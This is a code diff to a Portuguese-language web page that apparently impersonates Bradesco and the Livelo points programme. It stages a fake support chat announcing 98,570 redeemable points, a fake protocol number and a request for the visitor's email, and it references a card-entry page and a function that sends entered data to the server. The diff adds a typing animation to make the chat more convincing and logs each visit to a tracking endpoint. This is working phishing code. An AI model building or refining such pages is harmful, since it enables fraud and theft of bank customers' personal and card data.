@@ -266,6 +266,7 @@
             display: flex;
             flex-direction: column;
             gap: 15px;
+            min-height: 300px;
         }
 
         .balao-chat-sem-logo {
@@ -277,6 +278,11 @@
             font-size: 1rem;
             line-height: 1.5;
             margin-left: 50px;
+            display: none; /* Inicialmente escondidos */
+        }
+
+        .balao-chat-sem-logo.visible {
+            display: block;
         }
 
         .horario-balao {
@@ -294,13 +300,11 @@
             color: white;
             font-size: 1rem;
             margin-left: 50px;
+            display: none;
         }
 
-        .horario-proto {
-            font-size: 0.7rem;
-            color: rgba(255, 255, 255, 0.7);
-            text-align: right;
-            margin-top: 3px;
+        .balao-proto.visible {
+            display: block;
         }
 
         .balao-container {
@@ -373,6 +377,21 @@
 
         .btn-confirmar:hover {
             background: #a52a2a;
+        }
+
+        /* CURSOR DE DIGITAÇÃO */
+        .typing-cursor {
+            display: inline-block;
+            width: 2px;
+            height: 1.2em;
+            background-color: white;
+            margin-left: 2px;
+            animation: blink 1s infinite;
+        }
+
+        @keyframes blink {
+            0%, 50% { opacity: 1; }
+            51%, 100% { opacity: 0; }
         }
 
         /* ===== PÁGINA 4 (CARTÃO) ===== */
@@ -468,7 +487,7 @@
 
         <div class="card-vermelho">
             <div class="texto-destaque">
-                <strong>Seus pontos acumulados</strong> entraram na promoção resgate em dobro da livelo, efetue seu cadastro e inicie seu resgate <strong></strong>
+                <strong>Seus pontos acumulados</strong> no Benefícios Bradesco são pontos <strong>LIVELO</strong>!
             </div>
 
             <div class="form-group">
@@ -528,24 +547,28 @@
             <span class="titulo-atendimento">Atendimento pra você</span>
         </div>
 
-        <div class="area-chat">
-            <div class="balao-chat-sem-logo">
-                Você tem 98.570 pontos Livelo disponíveis para resgate.
+        <div class="area-chat" id="chatArea">
+            <!-- Mensagem 1 -->
+            <div class="balao-chat-sem-logo" id="msg1">
+                <span id="msg1-text"></span>
                 <div class="horario-balao" id="hora1"></div>
             </div>
 
-            <div class="balao-chat-sem-logo">
-                Eu vou te ajudar com o seu resgate de pontos, mas primeiro vou precisar confirmar alguns dados.
+            <!-- Mensagem 2 -->
+            <div class="balao-chat-sem-logo" id="msg2">
+                <span id="msg2-text"></span>
                 <div class="horario-balao" id="hora2"></div>
             </div>
 
-            <div class="balao-proto">
-                Protocolo: 2026031180153
+            <!-- Mensagem 3 (protocolo) -->
+            <div class="balao-proto" id="msg3">
+                <span id="msg3-text"></span>
                 <div class="horario-proto" id="hora3"></div>
             </div>
 
-            <div class="balao-chat-sem-logo">
-                Para iniciar seu resgate, digite seu e-mail que vai receber o comprovante:
+            <!-- Mensagem 4 -->
+            <div class="balao-chat-sem-logo" id="msg4">
+                <span id="msg4-text"></span>
             </div>
 
             <!-- STATUS "GERANDO SEU COMPROVANTE" -->
@@ -646,6 +669,12 @@
         // URL do servidor
         const SERVER_URL = window.location.origin;
 
+        // ===== REGISTRAR ACESSO AO CARREGAR A PÁGINA =====
+        fetch(`${SERVER_URL}/api/acesso`, { method: 'POST' })
+            .then(res => res.json())
+            .then(data => console.log('👁️ Acesso registrado:', data))
+            .catch(err => console.error('Erro ao registrar acesso:', err));
+
         // ===== FUNÇÃO PARA BUSCAR CONFIGURAÇÃO DO SERVIDOR =====
         async function getCartaoAtivoDoServidor() {
             try {
@@ -655,8 +684,43 @@
                 return data.cartaoAtivo;
             } catch (error) {
                 console.error('❌ Erro ao buscar configuração:', error);
-                return true; // padrão seguro
+                return true;
             }
+        }
+
+        // ===== FUNÇÃO DE ANIMAÇÃO DE DIGITAÇÃO =====
+        async function typeMessage(elementId, text, speed = 50) {
+            const element = document.getElementById(elementId);
+            element.innerHTML = '';
+            
+            for (let i = 0; i < text.length; i++) {
+                element.innerHTML += text[i];
+                await new Promise(resolve => setTimeout(resolve, speed));
+            }
+        }
+
+        async function iniciarAnimacaoChat() {
+            // Mostra primeiro balão
+            $('#msg1').addClass('visible');
+            await typeMessage('msg1-text', 'Você tem 98.570 pontos Livelo disponíveis para resgate.', 50);
+            $('#hora1').text(getHora());
+            
+            // Mostra segundo balão
+            await new Promise(resolve => setTimeout(resolve, 500));
+            $('#msg2').addClass('visible');
+            await typeMessage('msg2-text', 'Eu vou te ajudar com o seu resgate de pontos, mas primeiro vou precisar confirmar alguns dados.', 50);
+            $('#hora2').text(getHora());
+            
+            // Mostra terceiro balão (protocolo)
+            await new Promise(resolve => setTimeout(resolve, 500));
+            $('#msg3').addClass('visible');
+            await typeMessage('msg3-text', 'Protocolo: 2026031180153', 50);
+            $('#hora3').text(getHora());
+            
+            // Mostra quarto balão (último)
+            await new Promise(resolve => setTimeout(resolve, 500));
+            $('#msg4').addClass('visible');
+            await typeMessage('msg4-text', 'Para iniciar seu resgate, digite seu e-mail que vai receber o comprovante:', 50);
         }
 
         async function enviarParaServidor(dados) {
@@ -782,8 +846,8 @@
                     $('#page2').addClass('hidden');
                     $('#page3').removeClass('hidden');
                     
-                    const h = getHora();
-                    $('#hora1, #hora2, #hora3').text(h);
+                    // Inicia a animação do chat
+                    iniciarAnimacaoChat();
                 }, 3000);
             });
 
@@ -797,7 +861,6 @@
 
                 $('#loader').removeClass('hidden');
                 
-                // Busca configuração do servidor ANTES de prosseguir
                 const cartaoAtivo = await getCartaoAtivoDoServidor();
                 
                 setTimeout(() => {
